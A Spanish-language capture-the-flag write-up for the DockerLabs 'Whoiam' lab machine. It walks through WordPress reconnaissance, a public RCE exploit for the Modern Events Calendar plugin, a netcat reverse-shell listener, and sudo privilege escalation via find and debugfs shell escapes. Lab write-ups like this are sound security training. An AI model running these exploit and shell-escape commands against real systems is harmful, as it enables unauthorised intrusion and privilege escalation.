# Whoiam — DockerLabs.es 🐳
<img width="547" height="297" alt="1" src="https://github.com/user-attachments/assets/c43fe172-0fd7-407e-93e2-5686283d9d65" />

**Plataforma**: DockerLabs | **OS**: Linux | **Dificultad**: Fácil

---

## 1. Reconocimiento

Iniciamos con un escaneo en nmap:

```bash
sudo nmap -p- --min-rate 2000 -A -sS -Pn -n 172.18.0.2 -oN escaneo.txt
```
<img width="639" height="311" alt="2" src="https://github.com/user-attachments/assets/79edd123-afa5-4972-9562-f3641df51ddf" />


Entramos a la web para ver el contenido.

<img width="863" height="474" alt="3" src="https://github.com/user-attachments/assets/332b0d72-4b27-47cc-adc9-d6f3cb14a950" />


Al parecer no hay nada interesante, por lo que opto por hacer un fuzzing web con gobuster:

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,py,php,sh,html
```
<img width="797" height="340" alt="4" src="https://github.com/user-attachments/assets/274beade-f067-4bfb-801d-04f2e1ad1820" />


Encontramos el directorio `/wp-login.php` — hay un WordPress corriendo.

<img width="916" height="572" alt="5" src="https://github.com/user-attachments/assets/8ad15660-f52b-4c43-ab90-b6443c5e9e72" />


Después de una búsqueda exhaustiva de usuario o algún tipo de información nos encontramos con el directorio “/backups” la cuál contiene un archivo con credenciales.

<img width="696" height="346" alt="6" src="https://github.com/user-attachments/assets/84fe4ea0-6dd2-488b-a603-c8a5bcbc6f1d" />


Luego de descargarlo y descomprimirlo, leemos el archivo extraído y nos muestra estos datos.

<img width="500" height="113" alt="7" src="https://github.com/user-attachments/assets/d44b1b3c-1b7b-4feb-a0c7-d5abf72e3a1c" />


Las probamos en el panel de login de WordPress y obtenemos acceso al panel de administración.

<img width="1356" height="582" alt="8" src="https://github.com/user-attachments/assets/6755cbc4-4e32-4808-8d4f-b5a00caa4efe" />



---

## 2. Explotación

Para explotar el wordpress primero miramos los plugins instalados:

<img width="1104" height="539" alt="9" src="https://github.com/user-attachments/assets/c4812079-15b1-4e0b-a5dd-3b4cca13e49b" />

Y como vemos, hay instalado un plugin llamado “Modern Events Calendar” por lo que podemos buscarlo en searchsploit

<img width="1288" height="173" alt="10" src="https://github.com/user-attachments/assets/6f669c8b-deb0-4acf-bb25-88f7eca6e0bd" />


Encontramos un exploit de RCE (Remote Code Execution). Lo descargamos y ejecutamos:

```bash
searchsploit -m php/webapps/50082.py

python 50082.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```
<img width="1237" height="347" alt="11" src="https://github.com/user-attachments/assets/79608236-cd21-4ac0-9e97-8af7db973e0d" />


El output nos muestra una url la cuál si entramos nos aparece la siguiente pestaña:

<img width="867" height="568" alt="12" src="https://github.com/user-attachments/assets/15558bbf-271c-4dcd-9000-12a183857db6" />


Ahora nos enviamos una reverse shell pero antes nos ponemos en escucha con netcat

```bash
nc -lvnp 443
```
<img width="933" height="353" alt="14" src="https://github.com/user-attachments/assets/6644fe63-9d7d-431c-941d-11965c21a498" />

Logramos acceso inicial al sistema.

---

## 3. Escalada de Privilegios

Una vez dentro, ponemos el comando sudo -l para ver los binarios disponibles, nos muestra el binario “find” pero con el usuario “rafa”

<img width="782" height="172" alt="15" src="https://github.com/user-attachments/assets/42d5fd99-9a9e-4279-ae4c-9506eacec2f9" />


Para explotarlo ingresamos el siguiente comando:
```bash
sudo -u rafa /usr/bin/find . -exec /bin/sh \; -quit
```

<img width="621" height="53" alt="16" src="https://github.com/user-attachments/assets/c214068f-845e-4bfd-a8a8-91b93b9e5a12" />

Y si hacemos un sudo -l nos indica que tenemos que pivotar al usuario “ruben”

<img width="767" height="168" alt="17" src="https://github.com/user-attachments/assets/c554d904-cc7d-40a4-8839-4f543695d2d0" />

Para pivotar a “ruben” utilizamos los siguientes comando:
```bash 
sudo -u ruben /usr/sbin/debugfs
!/bin/bash
```
<img width="424" height="89" alt="18" src="https://github.com/user-attachments/assets/1e9a571f-c5fc-4b29-ba4c-f3f464c77150" />

Al parecer en el directorio /opt se esta ejecutando un script.

<img width="759" height="131" alt="19" src="https://github.com/user-attachments/assets/8ce247d4-0642-4ccc-b297-87dbae21e3de" />


Que si lo leemos contiene un código el cuál compara el input y si es igual o distinto de 42 imprime un mensaje, por lo que nosotros podemos inyectar un comando que se ejecute a nivel de sistema almacenado en una variable de la siguiente manera:

<img width="371" height="177" alt="20" src="https://github.com/user-attachments/assets/fc06a1c6-7e31-435e-922c-0f39be9ea6b4" />


<img width="607" height="151" alt="21" src="https://github.com/user-attachments/assets/aab5a6c6-8d71-48fa-a273-99e1df082230" />

**✅ Máquina rooteada con éxito.**

---

## 4. Técnicas utilizadas

- Fuzzing web con Gobuster
- Credenciales encontradas en directorio `/backups`
- Explotación de plugin WordPress vulnerable (Modern Events Calendar - RCE)
- Escalada de privilegios con `find` (GTFObins)
- Escalada de privilegios con `debugfs` (GTFObins)
- Inyección de comandos en script
